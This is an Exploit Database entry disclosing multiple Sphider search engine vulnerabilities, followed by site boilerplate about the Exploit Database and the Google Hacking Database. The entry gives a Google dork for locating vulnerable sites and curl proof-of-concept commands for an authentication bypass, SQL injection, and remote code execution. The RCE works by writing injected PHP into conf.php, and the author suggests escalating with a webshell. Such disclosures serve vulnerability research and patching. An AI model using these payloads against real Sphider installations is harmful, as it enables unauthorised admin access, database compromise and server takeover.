# Exploit Title: Sphider Search Engine - Multiple Vulnerabilities
# Google Dork: ext:php intext:sphider inurl:search.php
# Date: 6/20/2014
# Exploit Author: Shayan Sadigh (twitter.com/r1pplex) | <ienjoy.ripples@gmail.com>
# Vendor Homepage: http://www.sphider.eu/
# Version: Sphider < 1.3.6 | Sphider Pro/Plus as well
# Tested on: Linux & Windows
# CVE : CVE-2014-5081, CVE-2014-5082, CVE-2014-5083, CVE-2014-5084, CVE-2014-5085, CVE-2014-5086, CVE-2014-5087

1. (patched April 2013), in all versions before 1.3.6 for sphider, 3.2 for sphider-pro, and 3.2 for sphider-plus,
existed an auth bypass in auth.php, the fix for this was adding an exit();. before that anyone could simply send credentials
that would not be validated and still login

PoC: curl -d "user=foo&pass=bar" "localhost/sphider/admin/admin.php"
(or auth.php)

CVE-2014-5081.
-------------------------------------------------------------------------------------------------------------------------------------

2. SQLi injection (exists in sphider/pro/plus [every version], not patched)..
A quick glance at the admin.php file shows that this software does not make many attempts to sanatize inputs, and thus leading to issues..
the following file is from sphider-1.3.6 | http://pastebin.com/raw.php?i=7NJQznmA
from: http://www.sphider.eu/sphider-1.3.6.zip

PoC: localhost:~$ curl -d "user=foo&pass=bar&f=20&site_id=1'" "http://localhost/sphider/admin/admin.php" | grep "MySQL"

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1

?f=20&site_id=SQLi
?f=index&adv=1&url=SQLi

and more..

CVE-2014-5082.
-------------------------------------------------------------------------------------------------------------------------------------

3. Remote Code Execution (the most severe..)
An RCE exists in every version of sphider/pro/plus and has not been patched, this is not as severe as before due to the fact that
you need authentication but combined with the previous auth bypass in older versions it can be quite dangerous. Not to mention
the possible chance of people keeping the default (admin:admin) login credentials. There is basically 107 instances of this "RCE",
it is due to sphider using fwrite to write / save the crawler's settings, the issue however is that there is complete lack of
sanatization...which means an attacker can simply feed sphider malicious PHP and it will be written into the conf.php
(localhost/sphider/settings/conf.php). In sphider plus/pro there is even more instances of fwrite in the configset.php
due to the more config options avaliable.

Example (from sphider-1.3.6):

fwrite($fhandle,"\n\n\n/*********************** \nWeights\n***********************/");
		fwrite($fhandle, "\n\n// Relative weight of a word in the title of a webpage\n");
		fwrite($fhandle,"$"."title_weight  = ".$_title_weight. ";");
		fwrite($fhandle, "\n\n// Relative weight of a word in the domain name\n");
		fwrite($fhandle,"$"."domain_weight = ".$_domain_weight. ";");
		fwrite($fhandle, "\n\n// Relative weight of a word in the path name\n");
		fwrite($fhandle,"$"."path_weight	= ".$_path_weight. ";");
		fwrite($fhandle, "\n\n// Relative weight of a word in meta_keywords\n");
		fwrite($fhandle,"$"."meta_weight	= ".$_meta_weight. ";");

		fwrite($fhandle,"?>");
		fclose($fhandle);

	}

as you can see the complete lack of santization here allows one to simply feed one of these fields arbitrary php and it will be written to conf.php; this code is reused in all sphider forks/clones

PoC: localhost:~$ curl -d "user=foo&pass=bar&f=settings&Submit=ion_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100&_pdftotext_path=&_catdoc_path=&_xls2csv_path=&_catppt_path=&_user_agent=&_min_delay=0&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_desc_length=250&_suggest_rows=0&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5;echo phpversion();" "http://localhost/sphider/admin/admin.php" | grep "5.3"

5.3.3<div id='submenu'>&nbsp;</div>

Obviously it can be taken a step further and one may inject a php-webshell into conf.php and further escalate..

There is another POSSIBLE RCE, (yes by code) however I have not been able to test it..this rce requires the file converter(s) to be installed, once they are...

admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
admin/spiderfuncs.php:		$a = exec($command,$result, $retval);

once again the lack of sanatization allows possible remote code execution.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
